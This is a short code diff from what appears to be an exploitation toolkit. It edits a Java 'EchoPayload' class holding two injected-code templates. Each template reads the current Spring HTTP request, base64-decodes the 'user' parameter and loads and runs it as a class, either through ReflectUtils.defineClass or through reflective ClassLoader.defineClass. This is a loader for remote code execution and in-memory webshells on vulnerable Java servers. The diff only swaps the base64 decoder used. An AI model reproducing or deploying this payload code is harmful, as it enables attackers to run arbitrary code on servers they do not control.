@@ -9,12 +9,12 @@ public class CustomLoader implements EchoPayload {
 
     public static String loaderCodeWithFirstWay = "public A() {\n" +
             "   javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
-            "   org.springframework.cglib.core.ReflectUtils.defineClass(\"#{className}\", org.springframework.util.Base64Utils.decodeFromString(req.getParameter(\"user\")), java.lang.Thread.currentThread().getContextClassLoader()).newInstance().equals(req);\n"+
+            "   org.springframework.cglib.core.ReflectUtils.defineClass(\"#{className}\", java.util.Base64.getDecoder().decode(req.getParameter(\"user\")), java.lang.Thread.currentThread().getContextClassLoader()).newInstance().equals(req);\n"+
             "}";
 
     public static String loaderCodeWithSecondWay = "public B() {\n" +
             "   javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
-            "   byte[] classBytes = org.apache.shiro.codec.Base64.decode(req.getParameter(\"user\"));\n"+
+            "   byte[] classBytes = java.util.Base64.getDecoder().decode(req.getParameter(\"user\"));\n"+
             "   java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
             "   defineClassMethod.setAccessible(true);\n"+
             "   ((Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{classBytes, new Integer(0), new Integer(classBytes.length)})).newInstance().equals(req);\n"+
